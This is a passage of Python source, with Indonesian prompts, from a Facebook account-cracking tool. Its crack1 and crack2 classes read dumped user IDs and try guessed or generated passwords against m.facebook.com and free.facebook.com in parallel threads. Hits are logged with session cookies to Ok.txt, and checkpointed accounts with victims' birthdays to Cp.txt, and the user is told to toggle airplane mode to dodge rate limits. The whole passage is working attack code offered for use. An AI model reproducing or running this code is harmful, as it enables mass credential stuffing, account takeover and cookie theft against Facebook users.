					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+"          "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r *Crack %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n *-> Password Auto/Manual (a/m) : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' *! File Tidak Ada')
					continue
				print(' *•> Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="a":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' *! File Tidak Valid')
					menu()
					continue
				print(' *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
				print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
				print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n*Selesai*')
				break
	def pwlist(self):
		self.pw=raw_input(" *-> Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print('\n *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
                        print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
                        print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n*Selesai*')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log = mfb(fl.get('id'), i, 'https://m.facebook.com')
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"	         "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"].replace("/","-")

					except (KeyError, IOError):
		                         tl = " "
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+"          "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r *Crack %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n *-> Password Auto/Manual (a/m) : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' *! File Tidak Ada')
					continue
				print(' *•> Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="a":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' *! File Tidak Valid')
					menu()
					continue
				print(' *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
				print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
				print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n*Selesai*')
				break
	def pwlist(self):
		self.pw=raw_input(" *-> Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print('\n *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
                        print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
                        print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n*Selesai*')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"          "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"].replace("/","-")

					except (KeyError, IOError):
		                         tl = " "
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+"          "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r *Crack %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	menu()